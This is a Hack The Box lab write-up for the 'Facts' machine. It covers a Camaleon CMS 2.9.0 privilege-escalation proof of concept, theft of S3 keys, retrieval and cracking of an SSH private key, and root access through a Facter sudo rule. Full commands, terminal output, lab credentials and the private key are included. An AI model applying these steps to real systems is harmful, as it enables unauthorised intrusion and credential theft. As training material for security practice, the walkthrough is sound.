---
title: Facts
description: Facts Hack The Box writeup covering Camaleon CMS escalation, S3-backed SSH key recovery and Facter sudo abuse.
---

# Facts

<img class="htb-banner" src="images/banner.png" alt="Facts box banner placeholder">

!!! note "Replaceable banner"
    Replace `images/banner.png` in this box folder with the final Facts artwork. The page already points to that filename.

| Field | Value |
| --- | --- |
| Status | Completed — May 2, 2026 |
| Difficulty | Easy |
| Focus | AWS, Linux, Web |
| Machine | [Facts on Hack The Box](https://app.hackthebox.com/machines/Facts?sort_by=created_at&sort_type=desc) |

## Attack path

1. Enumerate SSH, HTTP and the MinIO-compatible service on port 54321.
2. Identify Camaleon CMS 2.9.0 and use the privilege-escalation proof of concept to obtain S3 credentials.
3. Browse the internal S3 bucket and retrieve the `trivia` user's encrypted SSH key.
4. Crack the SSH-key passphrase and log in as `trivia`.
5. Abuse passwordless sudo access to `/usr/bin/facter` with a custom Ruby fact and obtain root.

## 1. Reconnaissance

The scan exposed the following services:

```bash
nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan LAB_IP
```

| Port | Service | Observation |
| ---: | --- | --- |
| 22/tcp | SSH | OpenSSH 9.9p1 on Ubuntu. |
| 80/tcp | HTTP | Nginx-hosted web application. |
| 54321/tcp | HTTP/MinIO | S3-compatible object-storage endpoint. |

The supplied screenshots document the three reconnaissance views in order.

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-1.png" alt="Facts reconnaissance screenshot one" loading="lazy">
  <figcaption><strong>Figure 1.</strong> The first web and service-enumeration view for Facts.</figcaption>
</figure>

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-2.png" alt="Facts reconnaissance screenshot two" loading="lazy">
  <figcaption><strong>Figure 2.</strong> The second reconnaissance view from the completed machine session.</figcaption>
</figure>

<figure class="htb-figure">
  <img class="htb-screenshot" src="images/image-3.png" alt="Facts reconnaissance screenshot three" loading="lazy">
  <figcaption><strong>Figure 3.</strong> The third reconnaissance view used to confirm the web and storage attack surface.</figcaption>
</figure>

## 2. Escalate Camaleon CMS and extract storage credentials

The source notes identify Camaleon CMS 2.9.0 and use a proof of concept to authenticate, elevate the application role and extract the S3 configuration. The important sequence is:

```bash
python3 exploit.py \
  -u http://facts.htb \
  -U hello123 \
  -P 'Admin@123!' \
  -e
```

A successful run reports the CSRF-token exchange, login, role update and S3 endpoint. The lab credentials and endpoint recorded in the source notes are:

```text
s3_access_key: AKIA0BCAE891CB6A9209
s3_secret_key: gLnvKRmGgoDyLTeAvyErqvdijc8WVFLJhNgj0Uiu
s3_endpoint: http://localhost:54321
```

Configure the AWS client with the credentials returned by the exploit. When the service is exposed through the target hostname, use the target as the endpoint URL:

```bash
aws configure

aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
```

The internal bucket contains the `trivia` user's home data, including `.ssh/authorized_keys` and an encrypted `id_ed25519` key. Retrieve the relevant files for offline analysis:

```bash
aws --endpoint-url http://facts.htb:54321 \
  s3 cp s3://internal/.ssh/authorized_keys ./authorized_keys

aws --endpoint-url http://facts.htb:54321 \
  s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

## 3. Crack the SSH-key passphrase

Convert the OpenSSH key into a John the Ripper format and run the supplied wordlist:

```bash
ssh2john id_ed25519 > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The completed run recovered the passphrase recorded in the source notes:

```text
dragonballz
```

Use the key to log in as `trivia`:

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
```

The user flag was verified from `/home/william/user.txt`; its value is redacted here:

```bash
trivia@facts:/home/william$ cat user.txt
<USER_FLAG_REDACTED>
```

## 4. Abuse Facter sudo permissions

Check the allowed sudo commands:

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

Facter loads custom facts from a directory. Create a Ruby fact that executes a shell, then invoke Facter as root with that directory:

```bash
cat > bash.rb <<'RUBY'
exec "/bin/bash"
RUBY

sudo /usr/bin/facter --custom-dir /home/trivia bash
```

The command returns a root shell because the custom fact is evaluated by the privileged Facter process:

```bash
root@facts:/home/trivia# whoami
root

root@facts:~# cat /root/root.txt
<ROOT_FLAG_REDACTED>
```

## Takeaways

- Treat CMS privilege escalation findings as a path to the application secrets, not necessarily the final shell.
- Lock down object-storage endpoints and never expose private SSH material through a readable bucket.
- Review `sudo -l` entries for interpreters and tools that load scripts or plugins from attacker-controlled paths.
- A passwordless sudo rule for Facter becomes code execution as root when custom facts are not constrained.
## Complete source command blocks

The following blocks preserve the complete typed commands and terminal output from the supplied source note. Output is kept intact except for user and root flag values, which are represented by the redaction markers used above.

### Source block 1 (`jsx`)

```jsx
─$ nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.129.243.203  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-23 13:59 +0530
Nmap scan report for facts.htb (10.129.243.203)
Host is up (0.65s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    Golang net/http server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=3/23%Time=69C0FA96%P=aarch64-unknown-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request
SF:\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\
SF:x20application/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x2
SF:0max-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-
SF:2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\
SF:r\nX-Amz-Request-Id:\x20189F6B6A877828A1\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2023
SF:\x20Mar\x202026\x2008:34:43\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x2
SF:0encoding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Inva
SF:lid\x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resourc
SF:e><RequestId>189F6B6A877828A1</RequestId><HostId>dd9025bab4ad464b049177
SF:c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOpt
SF:ions,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x20
SF:23\x20Mar\x202026\x2008:34:45\x20GMT\r\nContent-Length:\x200\r\n\r\n")%
SF:r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1
SF:\.0\x20400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Leng
SF:th:\x20303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nS
SF:trict-Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\n
SF:Vary:\x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b
SF:3fd1af9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x20189F6B7210E3AFB3\r\
SF:nX-Content-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=
SF:block\r\nDate:\x20Mon,\x2023\x20Mar\x202026\x2008:35:15\x20GMT\r\n\r\n<
SF:\?xml\x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>Invali
SF:dRequest</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</
SF:Message><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestI
SF:d>189F6B7210E3AFB3</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf37
SF:4d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 213.72 seconds
                                                               
```

### Source block 2 (`jsx`)

```jsx
 python3 exploit.py \                                                                                                                                                                                       ─╯
-u http://facts.htb \
-U hello123 \
-P Admin@123! \
-e
[+] Camaleon CMS 2.9.0 PRIVILEGE ESCALATION
[+] Fetching login page: http://facts.htb/admin/login
[+] CSRF Token: m1U8yefLN5zDzqZKs0fBlV0OiKTTM-3FIvbYlnLXLkuRF1pg5m5mOVQ05lju92EwitCHXni4BRCIUOAHgZ1EWw
[+] Attempting login
[+] Login successful
[+] Loading profile page
[+] Profile CSRF: J8jOnVo2T2IVQD8BXfRWrJPnG9XA_IMHHSkl5NSe5j0tiqg0W5Mex4K6fxMARPYJRDkUL2t3a9K3jx11J9SMLQ
[+] User ID: 6
[+] Current Role: admin
[+] Performing privilege escalation
[+] Update request status: 200
[+] Updated Role: admin
[+] Privilege escalation SUCCESS
[+] Extracting S3 credentials
    s3_access_key: AKIA0BCAE891CB6A9209
    s3_secret_key: gLnvKRmGgoDyLTeAvyErqvdijc8WVFLJhNgj0Uiu
    s3_endpoint: http://localhost:54321
```

### Source block 3 (`jsx`)

```jsx
┌──(venv)─(exploiter㉿kali)-[~/exploits/CVE-2025-2304]
└─$ aws configure
AWS Access Key ID [None]: AKIAB033671D26246231
AWS Secret Access Key [None]: aAO1ox+dDHn3m/I+ReCZDrOvwSohnAL384mpY4Iq
Default region name [None]: 
Default output format [None]: 

aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/                                                                                                                                             ─╯
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-09 00:15:13        220 .bash_logout
2026-01-09 00:15:13       3900 .bashrc
2026-01-09 00:17:17         20 .lesshst
2026-01-09 00:17:17        807 .profile
                                                                                                                                                                                              
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/                                                                                                                                        ─╯
2026-05-02 15:19:55         82 authorized_keys
2026-05-02 15:19:55        464 id_ed25519            
                                                                                                                                                                                              
┌──(venv)─(exploiter㉿kali)-[~/exploits/CVE-2025-2304]
└─$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys ./authorized_keys
download: s3://internal/.ssh/authorized_keys to ./authorized_keys
                                                                                                                                                                                              
┌──(venv)─(exploiter㉿kali)-[~/exploits/CVE-2025-2304]
└─$ ls
authorized_keys  exploit.py  id_ed25519  README.md  venv
                                                                                                                                                                                              
┌──(venv)─(exploiter㉿kali)-[~/exploits/CVE-2025-2304]
└─$ cat id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCsYSQk2m
BRy0ivCvRwFqGOAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMwXh/eUXmWHRStQ
oc3ead1wEvjwqwDqtUMKP9nuD1aTAAAAoLZnjateq5OZHk0fkXYQYDN8DJOJPZmrEe3CiW
MyTueBkDZPf0eGvsCubtYrm/7PuljJ3+NODgQk0NjJnYhOb7qj0ii4ZUyaA0ZUp7Yd2GMm
+Cj8jl2Eiwo3sDQNmoRmPh/nt7+5M8jZoNw7UR2UcJFLtHb6mHcOl5tTCme28nYYmqcf6M
utbKey+rtBxm9/iHGFXLy65mVYff8MGnf9ueo=
-----END OPENSSH PRIVATE KEY-----
                                                                                                                                                                                              
┌──(venv)─(exploiter㉿kali)-[~/exploits/CVE-2025-2304]
└─$ cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwXh/eUXmWHRStQoc3ead1wEvjwqwDqtUMKP9nuD1aT 
                                                                                 
```

### Source block 4 (`bash`)

```bash
ssh2john .ssh/id_ed25519 > hash.txt
cat hash.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ .ssh/id_ed25519:$sshng$6$16$cdfb9b70e2de948c7f823464a40b4d9d$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010cdfb9b70e2de948c7f823464a40b4d9d000000180
       │ 0000001000000330000000b7373682d656432353531390000002035021ff3ab31d5e354b323d051877c8dfa82fa55fb4513577916d0624bf589cc000000a0ed07841106c89ef282ca64110244f9218c7026a489bb53949a49b2fcf8547d64e5422eb3c3e
       │ 832ef5f9102a9e285e81f252fdd731d12d49964646c232fb38639c78c1124aa250bc6b695c72baa02978ac95100fd6cce3034978e8d58fee0cd495132faa8f837f5761ea489b5ea96e9db98b9de185a468a3e3591724f43b19564d1b39a563ebf318c562
       │ 0634127bf3d33953781fb06379661da6d1f465c908d77$24$130
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

┌──[kali@Shieldbyte53]─[~/CVEs/CVE-2025-2304/loot] [main ✗]
└─❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:25 0.02% (ETA: 2026-05-08 22:05) 0g/s 32.10p/s 32.10c/s 32.10C/s bebito..medicina
dragonballz      (.ssh/id_ed25519)
1g 0:00:01:41 DONE (2026-05-02 16:31) 0.009804g/s 31.37p/s 31.37c/s 31.37C/s billy1..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Source block 5 (`bash`)

```bash
┌──[kali@Shieldbyte53]─[~/CVEs/CVE-2025-2304/loot] [main ✗]
└─❯ ssh -i .ssh/id_ed25519 trivia@facts.htb
The authenticity of host 'facts.htb (10.129.244.96)' can't be established.
ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:26: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key '.ssh/id_ed25519':
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May  2 11:07:30 AM UTC 2026

  System load:           0.0
  Usage of /:            72.8% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             220
  Users logged in:       1
  IPv4 address for eth0: 10.129.244.96
  IPv6 address for eth0: dead:beef::250:56ff:fe95:e80a

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$
```

### Source block 6 (`bash`)

```bash
trivia@facts:/home$ ls
trivia  william
trivia@facts:/home$ cd william
trivia@facts:/home/william$ ls
user.txt
trivia@facts:/home/william$ cat user.txt
<USER_FLAG_REDACTED>
```

### Source block 7 (`bash`)

```bash
trivia@facts:~$ sudo /usr/bin/facter --custom-dir /home/triva bash

trivia@facts:~$ whoami
trivia
trivia@facts:~$ echo 'exec "/bin/bash"' > exploit.rb
trivia@facts:~$ ls
bash.rb  exploit.rb  linpeas.sh
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
trivia@facts:~$ sudo /usr/bin/facter --custom-dir /home/trivia bash
root@facts:/home/trivia# ls
bash.rb  exploit.rb  linpeas.sh
root@facts:/home/trivia# cd /root
root@facts:~# ls
minio-binaries  ministack  root.txt  snap
root@facts:~# cat root.txt
<ROOT_FLAG_REDACTED>
root@facts:~#
```
